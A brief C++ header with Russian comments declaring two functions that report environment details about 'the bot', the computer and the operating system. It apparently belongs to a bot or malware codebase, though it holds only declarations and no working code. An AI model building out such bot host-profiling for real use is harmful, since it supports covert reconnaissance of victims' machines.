#include "../../core/include/core/memory.h"
#pragma once

//возвращает различную информацию о боте, компе, ОС

//полная информация об окружении в котором работает бот в текстовом виде
void GetEnvironmentComment( StringBuilder& s );
//пишет информацию в память s размером sz_s, возвращает длину полученной строки
int GetEnvironmentComment( char* s, int sz_s );
